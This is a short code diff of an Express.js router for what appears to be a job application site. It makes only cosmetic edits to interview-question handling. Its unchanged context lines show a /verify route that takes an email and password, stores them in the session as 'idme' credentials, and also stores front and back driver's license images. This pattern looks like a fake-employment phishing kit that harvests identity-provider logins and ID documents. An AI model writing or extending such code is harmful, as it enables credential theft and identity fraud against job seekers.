@@ -48,8 +48,7 @@ function normalizePosition(pos) {
   return pos.trim().toLowerCase().replace(/[\s/&-]+/g, ' ').replace(/\s+/g, ' ').trim();
 }
 
-const INTERVIEW_QUESTIONS_MAP = {
-};
+const INTERVIEW_QUESTIONS_MAP = {};
 
 const DEFAULT_QUESTIONS = [
   { name: "about", label: "Tell us about yourself and your professional background." },
@@ -128,7 +127,7 @@ router.post('/interview', requireSession, express.urlencoded({ extended: true })
   selectedQuestions.forEach(q => {
     interviewAnswers[q.name] = req.body[q.name] || '';
   });
-  req.session.interviewAnswers = interviewAnswers;
+  req.session.interviewAnswers = interviewAnswers; // <-- Always set, even if empty
   res.render('info-note');
 });
 
@@ -152,7 +151,6 @@ router.post('/verify', requireSession, driversLicenseUpload.fields(dlFields), as
   const { email, password } = req.body;
   req.session.verified = true;
   req.session.idme = { email, password };
-
   req.session.driversLicenseFiles = [dlFront, dlBack];
 
   const application = req.session.applicationDraft;
